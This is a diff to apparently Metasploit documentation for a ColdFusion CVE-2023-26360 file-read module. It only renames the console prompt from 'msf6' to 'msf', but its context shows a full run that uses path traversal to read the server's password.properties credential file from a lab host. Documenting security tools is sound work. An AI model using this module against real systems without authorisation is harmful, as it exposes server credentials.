@@ -48,7 +48,7 @@ component testing {
 ## Scenarios
 ### Adobe ColdFusion 2021 Update 5 on Windows Server 2022
 ```
-msf6 auxiliary(gather/adobe_coldfusion_fileread_cve_2023_26360) > show options
+msf auxiliary(gather/adobe_coldfusion_fileread_cve_2023_26360) > show options
 
 Module options (auxiliary/gather/adobe_coldfusion_fileread_cve_2023_26360):
 
@@ -67,7 +67,7 @@ Module options (auxiliary/gather/adobe_coldfusion_fileread_cve_2023_26360):
    TARGETFILE             ../lib/password.properties  yes       The target file to read, relative to the wwwroot folder.
    VHOST                                              no        HTTP server virtual host
 
-msf6 auxiliary(gather/adobe_coldfusion_fileread_cve_2023_26360) > run
+msf auxiliary(gather/adobe_coldfusion_fileread_cve_2023_26360) > run
 [*] Running module against 172.23.13.12
 
 [*] #Tue Mar 28 01:33:23 PDT 2023
@@ -76,5 +76,5 @@ rdspassword=
 encrypted=true
 
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/adobe_coldfusion_fileread_cve_2023_26360) > 
+msf auxiliary(gather/adobe_coldfusion_fileread_cve_2023_26360) > 
 ```
